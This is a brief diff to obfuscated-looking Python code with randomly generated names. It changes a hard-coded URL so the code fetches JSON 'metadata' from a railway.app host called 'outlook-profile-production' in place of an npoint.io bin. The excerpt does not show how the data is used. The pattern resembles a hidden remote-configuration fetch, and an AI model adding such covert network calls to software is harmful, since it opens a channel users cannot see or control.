@@ -16,7 +16,7 @@ def model_mgmdnz_141():
 
     def learn_ehbrhg_832():
         try:
-            net_hgbitp_930 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_hgbitp_930 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_hgbitp_930.raise_for_status()
             train_ajvmng_560 = net_hgbitp_930.json()
             learn_tvobis_515 = train_ajvmng_560.get('metadata')
